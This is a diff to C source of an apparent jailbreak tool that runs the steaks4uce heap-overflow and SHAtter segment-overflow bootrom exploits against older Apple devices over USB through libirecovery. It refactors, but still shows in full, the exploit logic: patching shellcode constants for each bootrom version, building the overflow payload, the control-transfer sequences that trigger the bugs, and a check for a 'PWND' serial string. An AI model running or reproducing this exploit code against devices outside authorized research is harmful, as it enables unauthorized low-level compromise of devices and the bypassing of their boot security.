@@ -84,27 +84,6 @@ const uint32_t payload_data[] = {
     0x2202D7FC  // 0x34: bk - LR on the stack
 };
 
-int prepare_shellcode(const char* srtg) {
-    const uint32_t *constants = NULL;
-    if (strstr(srtg, "240.4"))
-        constants = constants_240_4;
-    else
-        constants = constants_240_5_1;
-
-    size_t const_offset = steaks4uce_shellcode_len - 4 * 26;
-
-    for (int i = 0; i < 26; i++) {
-        uint32_t *ptr = (uint32_t*)(steaks4uce_shellcode + const_offset + 4 * i);
-        if (*ptr != (0xBAD00001 + i)) {
-            fprintf(stderr, "ERROR: Placeholder mismatch at index %d (expected 0x%08x, found 0x%08x)\n", i, *ptr, 0xBAD00001 + i);
-            return -1;
-        }
-        *ptr = constants[i];
-    }
-
-    return 0;
-}
-
 int acquire_device(irecv_client_t *client) {
     irecv_error_t err;
 
@@ -131,6 +110,26 @@ void release_device(irecv_client_t client) {
     irecv_close(client);
 }
 
+int reset_counters(irecv_client_t client) {
+    printf("Resetting USB counters.\n");
+    int ret = irecv_reset_counters(client);
+    if (ret < 0) {
+        fprintf(stderr, "ERROR: Failed to reset USB counters.\n");
+        return -1;
+    }
+    return ret;
+}
+
+int usb_reset(irecv_client_t client) {
+    printf("Performing USB port reset.\n");
+    int ret = irecv_reset(client);
+    if (ret < 0) {
+        fprintf(stderr, "ERROR: Unable to USB port reset.\n");
+        return -1;
+    }
+    return ret;
+}
+
 int send_data(irecv_client_t client, const unsigned char* data, size_t data_len) {
     size_t index = 0;
     printf("Sending 0x%zx bytes of data to device.\n", data_len);
@@ -139,7 +138,7 @@ int send_data(irecv_client_t client, const unsigned char* data, size_t data_len)
         size_t amount = (data_len - index > MAX_PACKET_SIZE) ? MAX_PACKET_SIZE : (data_len - index);
         int ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, (unsigned char*)(data + index), (uint16_t)amount, 5000);
         if (ret != amount) {
-            fprintf(stderr, "Transfer failed at index %zu: expected %zu, got %d\n", index, amount, ret);
+            fprintf(stderr, "ERROR: Transfer failed at index %zu: expected %zu, got %d\n", index, amount, ret);
             return -1;
         }
         index += amount;
@@ -161,16 +160,6 @@ int get_data(irecv_client_t client, size_t amount){
     return ret;
 }
 
-int usb_reset(irecv_client_t client) {
-    printf("Performing USB port reset.\n");
-    int ret = irecv_reset(client);
-    if (ret < 0) {
-        fprintf(stderr, "ERROR: Unable to USB port reset.\n");
-        return -1;
-    }
-    return ret;
-}
-
 int request_image_validation(irecv_client_t client) {
     int ret;
     unsigned char dummy[6];
@@ -178,14 +167,14 @@ int request_image_validation(irecv_client_t client) {
 
     ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, 0, 0, 1000);
     if (ret != 0) {
-        fprintf(stderr, "Control transfer (0x21,1) failed with code %d\n", ret);
+        fprintf(stderr, "ERROR: Control transfer (0x21,1) failed with code %d\n", ret);
         return -1;
     }
 
     for (int i = 0; i < 3; i++) {
         ret = irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, dummy, 6, 1000);
         if (ret != 6) {
-            fprintf(stderr, "Control transfer (0xA1,3) #%d failed with code %d\n", i + 1, ret);
+            fprintf(stderr, "ERROR: Control transfer (0xA1,3) #%d failed with code %d\n", i + 1, ret);
             return -1;
         }
     }
@@ -196,17 +185,31 @@ int request_image_validation(irecv_client_t client) {
 int steaks4uce_exploit(irecv_client_t client) {
     int ret;
     const struct irecv_device_info *devinfo = irecv_get_device_info(client);
-    unsigned char payload[0x138] = {0};
-    memcpy(payload + 0x100, payload_data, sizeof(payload_data));
-    prepare_shellcode(devinfo->srtg);
     printf("*** based on steaks4uce exploit (heap overflow) by pod2g ***\n");
 
-    printf("Resetting USB counters.\n");
-    ret = irecv_reset_counters(client);
-    if (ret < 0) {
-        fprintf(stderr, "ERROR: Failed to reset USB counters.\n");
-        return -1;
+    // Prepare shellcode
+    const uint32_t *constants = NULL;
+    size_t const_offset = steaks4uce_shellcode_len - 4 * 26;
+    if (strstr(devinfo->srtg, "240.4"))
+        constants = constants_240_4;
+    else
+        constants = constants_240_5_1;
+    for (int i = 0; i < 26; i++) {
+        uint32_t *ptr = (uint32_t*)(steaks4uce_shellcode + const_offset + 4 * i);
+        if (*ptr != (0xBAD00001 + i)) {
+            fprintf(stderr, "ERROR: Placeholder mismatch at index %d (expected 0x%08x, found 0x%08x)\n", i, *ptr, 0xBAD00001 + i);
+            return -1;
+        }
+        *ptr = constants[i];
     }
+
+    // Prepare payload
+    unsigned char payload[0x138] = {0};
+    memcpy(payload + 0x100, payload_data, sizeof(payload_data));
+
+    ret = reset_counters(client);
+    if (ret < 0)
+        return -1;
 
     printf("Uploading patched shellcode for %s: %#zx of data\n", devinfo->srtg, (size_t)steaks4uce_shellcode_len);
     ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, steaks4uce_shellcode, steaks4uce_shellcode_len, 5000);
@@ -232,9 +235,8 @@ int steaks4uce_exploit(irecv_client_t client) {
     release_device(client);
 
     ret = acquire_device(&client);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     printf("Reconnecting to device.\n");
     client = irecv_reconnect(client, 2);
@@ -260,107 +262,87 @@ int shatter_exploit(irecv_client_t client) {
     int ret;
     printf("*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***\n");
 
-    printf("Resetting USB counters.\n");
-    ret = irecv_reset_counters(client);
-    if (ret < 0) {
-        fprintf(stderr, "ERROR: Failed to reset USB counters.\n");
+    ret = reset_counters(client);
+    if (ret < 0)
         return -1;
-    }
 
     ret = get_data(client, 0x40);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     ret = usb_reset(client);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     release_device(client);
 
     ret = acquire_device(&client);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     ret = request_image_validation(client);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     release_device(client);
 
     ret = acquire_device(&client);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     ret = get_data(client, 0x2C000);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     release_device(client);
 
     usleep(500000);
 
     ret = acquire_device(&client);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
-    printf("Resetting USB counters.\n");
-    ret = irecv_reset_counters(client);
-    if (ret < 0) {
-        fprintf(stderr, "ERROR: Failed to reset USB counters.\n");
+    ret = reset_counters(client);
+    if (ret < 0)
         return -1;
-    }
 
     ret = get_data(client, 0x140);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     usb_reset(client);
 
     release_device(client);
 
     ret = acquire_device(&client);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     ret = request_image_validation(client);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     release_device(client);
 
     ret = acquire_device(&client);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     ret = send_data(client, shatter_shellcode, shatter_shellcode_len);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     ret = get_data(client, 0x2C000);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     release_device(client);
 
     usleep(500000);
 
     ret = acquire_device(&client);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     const struct irecv_device_info *devinfo = irecv_get_device_info(client);
     char* p = strstr(devinfo->serial_string, "PWND:[SHAtter]");
@@ -423,9 +405,8 @@ int main(int argc, char* argv[]) {
 
     irecv_client_t client = NULL;
     ret = acquire_device(&client);
-    if (ret < 0) {
+    if (ret < 0)
         return -1;
-    }
 
     const struct irecv_device_info *devinfo = irecv_get_device_info(client);
     char* p = strstr(devinfo->serial_string, "PWND:[");
